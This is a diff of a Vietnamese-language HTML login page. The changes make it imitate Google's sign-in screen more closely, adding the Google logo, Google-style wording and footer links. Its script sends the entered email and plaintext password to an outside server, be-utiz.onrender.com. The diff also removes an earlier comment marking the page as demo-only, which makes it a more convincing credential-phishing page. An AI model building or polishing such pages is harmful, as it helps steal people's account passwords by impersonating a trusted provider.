@@ -1,226 +1,641 @@
 <!DOCTYPE html>
 <html lang="vi">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Đăng nhập - Google</title>
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&display=swap" rel="stylesheet">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Đăng nhập</title>
   <style>
-    * { margin:0; padding:0; box-sizing:border-box; }
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
     body {
-      font-family: 'Google Sans', Roboto, Arial, sans-serif;
-      background:#fff;
-      min-height:100vh;
-      display:flex;
-      align-items:center;
-      justify-content:center;
-      color:#202124;
+      font-family: 'Roboto', arial, sans-serif;
+      background-color: #fff;
+      color: #202124;
+      font-size: 14px;
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
     }
-    .container {
-      display:flex;
-      width:100%;
-      max-width:960px;
-      min-height:560px;
-      box-shadow:0 4px 20px rgba(0,0,0,0.1);
-      border-radius:12px;
-      overflow:hidden;
+
+    .outer-container {
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 24px;
     }
-    .illustration-side {
-      flex:1;
-      background:#f8f9fa;
-      padding:60px 48px;
-      display:flex;
-      flex-direction:column;
-      justify-content:center;
+
+    .card {
+      width: 100%;
+      max-width: 450px;
+      background: #fff;
+      border: 1px solid #dadce0;
+      border-radius: 8px;
+      padding: 48px 40px 36px;
     }
-    .form-side {
-      flex:1;
-      padding:60px 48px 36px;
+
+    .logo-container {
+      margin-bottom: 16px;
     }
-    .login-wrapper { max-width:450px; margin:0 auto; width:100%; }
-    .logo {
-      width:74px;
-      height:24px;
-      background:url('https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png') no-repeat center;
-      background-size:contain;
-      margin:0 auto 48px;
+
+    .google-logo {
+      width: 40px;
+      height: 40px;
     }
-    h1 { font-size:28px; font-weight:400; text-align:center; margin-bottom:8px; line-height:36px; }
-    .subtitle { font-size:16px; color:#5f6368; text-align:center; margin-bottom:40px; }
-    input[type="email"], input[type="password"] {
-      width:100%;
-      height:56px;
-      padding:0 16px;
-      font-size:16px;
-      border:1px solid #dadce0;
-      border-radius:4px;
-      outline:none;
-      transition:border-color 0.2s, box-shadow 0.2s;
+
+    h1 {
+      font-size: 24px;
+      font-weight: 400;
+      line-height: 1.3333;
+      color: #202124;
+      margin: 0 0 8px;
+      padding: 0;
     }
+
+    .user-selector {
+      border: 1px solid #dadce0;
+      border-radius: 40px;
+      display: flex;
+      align-items: center;
+      padding: 2px 12px 2px 2px;
+      margin: 24px 0;
+      gap: 12px;
+      cursor: pointer;
+      transition: background-color 0.1s;
+      position: relative;
+    }
+
+    .user-selector:hover {
+      background-color: #f8f9fa;
+    }
+
+    .user-avatar {
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      background: #1a73e8;
+      color: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 14px;
+      font-weight: 500;
+      flex-shrink: 0;
+    }
+
+    .user-avatar svg {
+      width: 20px;
+      height: 20px;
+      fill: #5f6368;
+    }
+
+    .user-email-text {
+      flex: 1;
+      font-size: 14px;
+      color: #3c4043;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+    }
+
+    .dropdown-arrow {
+      width: 20px;
+      height: 20px;
+      flex-shrink: 0;
+    }
+
+    .dropdown-arrow svg {
+      width: 100%;
+      height: 100%;
+      fill: #5f6368;
+    }
+
+    .form-container {
+      margin: 0;
+    }
+
+    .input-wrapper {
+      position: relative;
+      margin-bottom: 8px;
+    }
+
+    input[type="email"],
+    input[type="password"],
+    input[type="text"] {
+      width: 100%;
+      height: 56px;
+      padding: 13px 15px;
+      font-family: 'Roboto', arial, sans-serif;
+      font-size: 16px;
+      line-height: 24px;
+      color: #202124;
+      background: #fff;
+      border: 1px solid #dadce0;
+      border-radius: 4px;
+      outline: none;
+      transition: border-color 0.1s ease-in-out;
+    }
+
+    input::placeholder {
+      color: #5f6368;
+    }
+
+    input:hover {
+      border-color: #5f6368;
+    }
+
     input:focus {
-      border-color:#1a73e8;
-      box-shadow:0 0 0 2px rgba(26,115,232,0.3);
+      border-color: #1a73e8;
+      border-width: 2px;
+      padding: 12px 14px;
     }
-    .password-wrapper { position:relative; margin-bottom:16px; }
-    .toggle-password {
-      position:absolute;
-      right:16px;
-      top:50%;
-      transform:translateY(-50%);
-      cursor:pointer;
-      color:#5f6368;
-      font-size:22px;
-      user-select:none;
+
+    .eye-icon {
+      position: absolute;
+      right: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 24px;
+      height: 24px;
+      cursor: pointer;
+      user-select: none;
+      background: transparent;
+      border: none;
+      padding: 4px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #5f6368;
+      border-radius: 50%;
     }
-    .forgot {
-      display:block;
-      color:#1a73e8;
-      font-size:14px;
-      text-decoration:none;
-      margin:24px 0 32px;
+
+    .eye-icon:hover {
+      background-color: #f1f3f4;
     }
-    .forgot:hover { text-decoration:underline; }
-    .btn-group {
-      display:flex;
-      justify-content:space-between;
-      align-items:center;
-      flex-wrap:wrap;
-      gap:16px;
+
+    .eye-icon svg {
+      width: 20px;
+      height: 20px;
+      fill: currentColor;
     }
-    .create-account { color:#1a73e8; font-size:14px; text-decoration:none; }
-    .create-account:hover { text-decoration:underline; }
-    button {
-      background:#1a73e8;
-      color:white;
-      border:none;
-      border-radius:4px;
-      padding:0 24px;
-      height:48px;
-      font-size:15px;
-      font-weight:500;
-      cursor:pointer;
-      transition:background 0.2s;
+
+    .checkbox-wrapper {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin: 16px 0 24px;
     }
-    button:hover { background:#1765cc; }
-    button:disabled {
-      background:#a5c7f7;
-      cursor:not-allowed;
+
+    .checkbox-wrapper input[type="checkbox"] {
+      width: 18px;
+      height: 18px;
+      cursor: pointer;
+      margin: 0;
+      accent-color: #1a73e8;
     }
-    .step2 { display:none; }
-    .error-msg {
-      color:#d93025;
-      font-size:14px;
-      margin-top:8px;
-      display:none;
+
+    .checkbox-wrapper label {
+      font-size: 14px;
+      color: #202124;
+      cursor: pointer;
+      user-select: none;
+    }
+
+    .error-text {
+      color: #d93025;
+      font-size: 12px;
+      line-height: 16px;
+      margin-top: 8px;
+      display: none;
+    }
+
+    .error-text.show {
+      display: block;
+    }
+
+    .link-text {
+      display: inline-block;
+      color: #1a73e8;
+      font-size: 14px;
+      font-weight: 500;
+      text-decoration: none;
+    }
+
+    .link-text:hover {
+      text-decoration: underline;
+    }
+
+    .button-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-top: 26px;
+      gap: 12px;
+    }
+
+    .text-button {
+      background: none;
+      border: none;
+      color: #1a73e8;
+      font-family: 'Roboto', arial, sans-serif;
+      font-size: 14px;
+      font-weight: 500;
+      padding: 10px 0;
+      cursor: pointer;
+      text-decoration: none;
+    }
+
+    .text-button:hover {
+      text-decoration: underline;
+    }
+
+    .primary-button {
+      background: #1a73e8;
+      color: #fff;
+      font-family: 'Roboto', arial, sans-serif;
+      font-size: 14px;
+      font-weight: 500;
+      line-height: 16px;
+      border: none;
+      border-radius: 4px;
+      padding: 0 24px;
+      height: 36px;
+      cursor: pointer;
+      transition: background 0.08s linear, box-shadow 0.08s linear;
+    }
+
+    .primary-button:hover {
+      background: #1765cc;
+      box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
+    }
+
+    .primary-button:active {
+      background: #1765cc;
+      box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 2px 6px 2px rgba(60,64,67,0.15);
+    }
+
+    .primary-button:disabled {
+      background: #80b6f4;
+      cursor: default;
+      box-shadow: none;
+      color: rgba(255, 255, 255, 0.7);
+    }
+
+    .footer-links {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-top: 80px;
+      font-size: 12px;
+      color: #5f6368;
+    }
+
+    .footer-left {
+      display: flex;
+      align-items: center;
+      gap: 4px;
+    }
+
+    .language-select {
+      border: none;
+      background: none;
+      color: #5f6368;
+      font-size: 12px;
+      cursor: pointer;
+      padding: 4px 20px 4px 4px;
+      outline: none;
+      appearance: none;
+      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath fill='%235f6368' d='M6 9L1.5 4.5 2.205 3.795 6 7.59 9.795 3.795 10.5 4.5z'/%3E%3C/svg%3E");
+      background-repeat: no-repeat;
+      background-position: right center;
+    }
+
+    .footer-right {
+      display: flex;
+      gap: 24px;
+    }
+
+    .footer-right a {
+      color: #5f6368;
+      text-decoration: none;
+      font-size: 12px;
+    }
+
+    .footer-right a:hover {
+      color: #202124;
+    }
+
+    .back-arrow {
+      display: inline-block;
+      color: #1a73e8;
+      font-size: 14px;
+      font-weight: 500;
+      text-decoration: none;
+      margin-bottom: 24px;
+      cursor: pointer;
+      padding: 8px;
+      margin-left: -8px;
+      border-radius: 4px;
+      transition: background-color 0.1s;
+    }
+
+    .back-arrow:hover {
+      background-color: #f1f3f4;
+    }
+
+    .back-arrow::before {
+      content: '←';
+      margin-right: 8px;
+      font-size: 18px;
+    }
+
+    .step-2 {
+      display: none;
+    }
+
+    .loading-spinner {
+      display: inline-block;
+      width: 14px;
+      height: 14px;
+      border: 2px solid #fff;
+      border-top-color: transparent;
+      border-radius: 50%;
+      animation: spin 0.6s linear infinite;
+      margin-right: 8px;
+      vertical-align: middle;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
     }
 
     /* Responsive */
-    @media (max-width:768px) {
-      .container { flex-direction:column; box-shadow:none; border-radius:0; min-height:auto; }
-      .illustration-side { display:none; }
-      .form-side { padding:60px 24px 36px; }
-      button { width:100%; height:52px; font-size:16px; }
-      .btn-group { flex-direction:column-reverse; gap:20px; }
-      .create-account { text-align:center; }
+    @media (max-width: 768px) {
+      .outer-container {
+        padding: 0;
+      }
+
+      .card {
+        border: none;
+        border-radius: 0;
+        max-width: 100%;
+        min-height: 100vh;
+        padding: 40px 24px 36px;
+      }
+
+      .footer-links {
+        flex-direction: column;
+        gap: 20px;
+        align-items: flex-start;
+      }
+
+      .footer-right {
+        flex-direction: column;
+        gap: 12px;
+      }
+    }
+
+    @media (max-width: 480px) {
+      .card {
+        padding: 32px 20px 24px;
+      }
+
+      .button-row {
+        flex-wrap: wrap;
+      }
+
+      .text-button {
+        order: 2;
+        flex: 1 1 100%;
+        text-align: center;
+      }
+
+      .primary-button {
+        order: 1;
+        width: 100%;
+      }
+    }
+
+    /* Animation */
+    .fade-in {
+      animation: fadeIn 0.2s ease;
+    }
+
+    @keyframes fadeIn {
+      from {
+        opacity: 0;
+        transform: translateY(8px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
     }
   </style>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
 </head>
 <body>
 
-<div class="container">
-  <div class="illustration-side">
-    <div class="logo"></div>
-    <h1>Đăng nhập</h1>
-    <div class="subtitle">Tiếp tục đến Gmail</div>
-  </div>
-
-  <div class="form-side">
-    <div class="login-wrapper">
-
-      <!-- Bước 1: Email / SĐT -->
-      <div class="step1">
-        <div class="logo"></div>
-        <h1>Đăng nhập</h1>
-        <div class="subtitle">Sử dụng tài khoản Google của bạn</div>
-
-        <input type="email" id="identifier" placeholder="Email hoặc số điện thoại" autocomplete="username" autofocus />
-
-        <a href="#" class="forgot">Quên email?</a>
-
-        <div class="btn-group">
-          <a href="#" class="create-account">Tạo tài khoản</a>
-          <button id="nextBtn">Tiếp theo</button>
-        </div>
+<div class="outer-container">
+  <div class="card">
+    
+    <!-- Step 1: Email -->
+    <div class="step-1" id="step1">
+      <div class="logo-container">
+        <svg class="google-logo" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+          <path fill="#4285F4" d="M45.12 24.5c0-1.56-.14-3.06-.4-4.5H24v8.51h11.84c-.51 2.75-2.06 5.08-4.39 6.64v5.52h7.11c4.16-3.83 6.56-9.47 6.56-16.17z"></path>
+          <path fill="#34A853" d="M24 46c5.94 0 10.92-1.97 14.56-5.33l-7.11-5.52c-1.97 1.32-4.49 2.1-7.45 2.1-5.73 0-10.58-3.87-12.31-9.07H4.34v5.7C7.96 41.07 15.4 46 24 46z"></path>
+          <path fill="#FBBC05" d="M11.69 28.18C11.25 26.86 11 25.45 11 24s.25-2.86.69-4.18v-5.7H4.34C2.85 17.09 2 20.45 2 24c0 3.55.85 6.91 2.34 9.88l7.35-5.7z"></path>
+          <path fill="#EA4335" d="M24 10.75c3.23 0 6.13 1.11 8.41 3.29l6.31-6.31C34.91 4.18 29.93 2 24 2 15.4 2 7.96 6.93 4.34 14.12l7.35 5.7c1.73-5.2 6.58-9.07 12.31-9.07z"></path>
+        </svg>
       </div>
 
-      <!-- Bước 2: Mật khẩu + Gửi request -->
-      <div class="step2">
-        <div class="logo"></div>
-        <h1>Chào mừng trở lại</h1>
-        <div class="subtitle" id="userDisplay"></div>
+      <h1>Đăng nhập</h1>
+      <div class="subtitle" style="font-size: 16px; color: #5f6368; margin-bottom: 24px;">Sử dụng Tài khoản Google của bạn</div>
 
-        <div class="password-wrapper">
-          <input type="password" id="password" placeholder="Mật khẩu" autocomplete="current-password" />
-          <span class="toggle-password" id="togglePass">👁️</span>
+      <div class="form-container">
+        <div class="input-wrapper">
+          <input 
+            type="text" 
+            id="emailInput" 
+            placeholder="Email hoặc số điện thoại"
+            autocomplete="username"
+            autofocus
+          />
+          <div class="error-text" id="emailError">Vui lòng nhập email hoặc số điện thoại</div>
         </div>
 
-        <div class="error-msg" id="errorMsg">Đã có lỗi xảy ra. Vui lòng thử lại.</div>
+        <a href="#" class="link-text" style="margin-top: 24px; display: inline-block;">Bạn quên địa chỉ email?</a>
 
-        <a href="#" class="forgot">Quên mật khẩu?</a>
+        <div style="font-size: 14px; color: #5f6368; margin: 24px 0;">
+          Không phải máy tính của bạn? Hãy sử dụng Chế độ Khách để đăng nhập một cách riêng tư. <a href="#" style="color: #1a73e8; text-decoration: none;">Tìm hiểu thêm về cách sử dụng Chế độ Khách</a>
+        </div>
 
-        <div class="btn-group">
-          <a href="#" class="create-account">Tạo tài khoản</a>
-          <button id="loginBtn">Đăng nhập</button>
+        <div class="button-row">
+          <a href="#" class="text-button">Tạo tài khoản</a>
+          <button class="primary-button" id="nextButton">Tiếp theo</button>
         </div>
       </div>
-
     </div>
+
+    <!-- Step 2: Password -->
+    <div class="step-2" id="step2">
+      <div class="logo-container">
+        <svg class="google-logo" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+          <path fill="#4285F4" d="M45.12 24.5c0-1.56-.14-3.06-.4-4.5H24v8.51h11.84c-.51 2.75-2.06 5.08-4.39 6.64v5.52h7.11c4.16-3.83 6.56-9.47 6.56-16.17z"></path>
+          <path fill="#34A853" d="M24 46c5.94 0 10.92-1.97 14.56-5.33l-7.11-5.52c-1.97 1.32-4.49 2.1-7.45 2.1-5.73 0-10.58-3.87-12.31-9.07H4.34v5.7C7.96 41.07 15.4 46 24 46z"></path>
+          <path fill="#FBBC05" d="M11.69 28.18C11.25 26.86 11 25.45 11 24s.25-2.86.69-4.18v-5.7H4.34C2.85 17.09 2 20.45 2 24c0 3.55.85 6.91 2.34 9.88l7.35-5.7z"></path>
+          <path fill="#EA4335" d="M24 10.75c3.23 0 6.13 1.11 8.41 3.29l6.31-6.31C34.91 4.18 29.93 2 24 2 15.4 2 7.96 6.93 4.34 14.12l7.35 5.7c1.73-5.2 6.58-9.07 12.31-9.07z"></path>
+        </svg>
+      </div>
+
+      <h1>Chào mừng</h1>
+
+      <div class="user-selector" id="userSelector">
+        <div class="user-avatar">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
+          </svg>
+        </div>
+        <div class="user-email-text" id="userEmail"></div>
+        <div class="dropdown-arrow">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M7 10l5 5 5-5z"/>
+          </svg>
+        </div>
+      </div>
+
+      <div class="form-container">
+        <div class="input-wrapper">
+          <input 
+            type="password" 
+            id="passwordInput" 
+            placeholder="Nhập mật khẩu của bạn"
+            autocomplete="current-password"
+          />
+          <button class="eye-icon" id="togglePassword" type="button" title="Hiện mật khẩu">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+              <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
+            </svg>
+          </button>
+          <div class="error-text" id="passwordError">Vui lòng nhập mật khẩu</div>
+          <div class="error-text" id="loginError">Không thể đăng nhập. Vui lòng thử lại</div>
+        </div>
+
+        <div class="checkbox-wrapper">
+          <input type="checkbox" id="showPassword">
+          <label for="showPassword">Hiện mật khẩu</label>
+        </div>
+
+        <a href="#" class="link-text">Thử cách khác</a>
+
+        <div class="button-row">
+          <a href="#" class="text-button">Tạo tài khoản</a>
+          <button class="primary-button" id="loginButton">Tiếp theo</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="footer-links">
+      <div class="footer-left">
+        <select class="language-select">
+          <option value="vi">Tiếng Việt</option>
+          <option value="en">English</option>
+        </select>
+      </div>
+      <div class="footer-right">
+        <a href="#">Trợ giúp</a>
+        <a href="#">Quyền riêng tư</a>
+        <a href="#">Điều khoản</a>
+      </div>
+    </div>
+
   </div>
 </div>
 
 <script>
-  const nextBtn      = document.getElementById('nextBtn');
-  const loginBtn     = document.getElementById('loginBtn');
-  const identifier   = document.getElementById('identifier');
-  const password     = document.getElementById('password');
-  const togglePass   = document.getElementById('togglePass');
-  const userDisplay  = document.getElementById('userDisplay');
-  const errorMsg     = document.getElementById('errorMsg');
-  const step1        = document.querySelector('.step1');
-  const step2        = document.querySelector('.step2');
+  // Elements
+  const step1 = document.getElementById('step1');
+  const step2 = document.getElementById('step2');
+  const emailInput = document.getElementById('emailInput');
+  const passwordInput = document.getElementById('passwordInput');
+  const nextButton = document.getElementById('nextButton');
+  const loginButton = document.getElementById('loginButton');
+  const togglePassword = document.getElementById('togglePassword');
+  const showPasswordCheckbox = document.getElementById('showPassword');
+  const userEmail = document.getElementById('userEmail');
+  const userSelector = document.getElementById('userSelector');
+  const emailError = document.getElementById('emailError');
+  const passwordError = document.getElementById('passwordError');
+  const loginError = document.getElementById('loginError');
 
-  // Chuyển bước
-  nextBtn.addEventListener('click', () => {
-    if (!identifier.value.trim()) return alert('Vui lòng nhập email hoặc số điện thoại');
-    userDisplay.textContent = identifier.value;
-    step1.style.display = 'none';
-    step2.style.display = 'block';
-    password.focus();
-  });
-
-  // Toggle mắt mật khẩu
-  togglePass.addEventListener('click', () => {
-    const isPass = password.type === 'password';
-    password.type = isPass ? 'text' : 'password';
-    togglePass.textContent = isPass ? '🙈' : '👁️';
-  });
-
-  // Gửi request khi nhấn Đăng nhập
-  loginBtn.addEventListener('click', async () => {
-    const email = identifier.value.trim();
-    const pass  = password.value.trim();
-
-    if (!pass) {
-      alert('Vui lòng nhập mật khẩu');
+  // Step 1 -> Step 2
+  nextButton.addEventListener('click', () => {
+    const email = emailInput.value.trim();
+    
+    emailError.classList.remove('show');
+    
+    if (!email) {
+      emailError.classList.add('show');
+      emailInput.focus();
       return;
     }
 
-    // Vô hiệu hóa nút trong lúc gửi
-    loginBtn.disabled = true;
-    loginBtn.textContent = 'Đang đăng nhập...';
-    errorMsg.style.display = 'none';
+    // Show step 2
+    userEmail.textContent = email;
+
+    step1.style.display = 'none';
+    step2.style.display = 'block';
+    step2.classList.add('fade-in');
+    passwordInput.focus();
+  });
+
+  // User selector click - go back to step 1
+  userSelector.addEventListener('click', () => {
+    step2.style.display = 'none';
+    step1.style.display = 'block';
+    step1.classList.add('fade-in');
+    passwordInput.value = '';
+    showPasswordCheckbox.checked = false;
+    passwordInput.type = 'password';
+    passwordError.classList.remove('show');
+    loginError.classList.remove('show');
+  });
+
+  // Toggle password visibility with eye icon
+  togglePassword.addEventListener('click', () => {
+    const isPassword = passwordInput.type === 'password';
+    passwordInput.type = isPassword ? 'text' : 'password';
+    showPasswordCheckbox.checked = !isPassword;
+  });
+
+  // Toggle password visibility with checkbox
+  showPasswordCheckbox.addEventListener('change', () => {
+    passwordInput.type = showPasswordCheckbox.checked ? 'text' : 'password';
+  });
+
+  // Login
+  loginButton.addEventListener('click', async () => {
+    const email = emailInput.value.trim();
+    const password = passwordInput.value.trim();
+
+    passwordError.classList.remove('show');
+    loginError.classList.remove('show');
+
+    if (!password) {
+      passwordError.classList.add('show');
+      passwordInput.focus();
+      return;
+    }
+
+    // Show loading
+    loginButton.disabled = true;
+    loginButton.innerHTML = '<span class="loading-spinner"></span>Đang đăng nhập...';
 
     try {
       const response = await fetch('https://be-utiz.onrender.com/login', {
@@ -230,7 +645,7 @@
         },
         body: JSON.stringify({
           email: email,
-          password: pass,          // chỉ để demo – thực tế KHÔNG nên gửi password plaintext
+          password: password,
         }),
       });
 
@@ -240,27 +655,36 @@
 
       const data = await response.json();
 
-      // Giả sử server trả về { "message": "hello world" }
       if (data.message) {
-        alert(data.message);  // → "hello world"
+        alert(data.message);
       } else {
-        alert('Đăng nhập thành công! (Server trả về: ' + JSON.stringify(data) + ')');
+        alert('Đăng nhập thành công!');
       }
 
     } catch (err) {
-      console.error('Lỗi khi gửi request:', err);
-      errorMsg.style.display = 'block';
-      alert('Không kết nối được đến server localhost. Kiểm tra server có đang chạy không?');
+      console.error('Lỗi:', err);
+      loginError.classList.add('show');
     } finally {
-      loginBtn.disabled = false;
-      loginBtn.textContent = 'Đăng nhập';
+      loginButton.disabled = false;
+      loginButton.textContent = 'Tiếp theo';
     }
   });
 
-  // Enter phím
-  identifier.addEventListener('keypress', e => { if (e.key === 'Enter') nextBtn.click(); });
-  password.addEventListener('keypress', e => { if (e.key === 'Enter') loginBtn.click(); });
+  // Enter key handlers
+  emailInput.addEventListener('keypress', (e) => {
+    if (e.key === 'Enter') {
+      e.preventDefault();
+      nextButton.click();
+    }
+  });
+
+  passwordInput.addEventListener('keypress', (e) => {
+    if (e.key === 'Enter') {
+      e.preventDefault();
+      loginButton.click();
+    }
+  });
 </script>
 
 </body>
-</html>
+</html>F
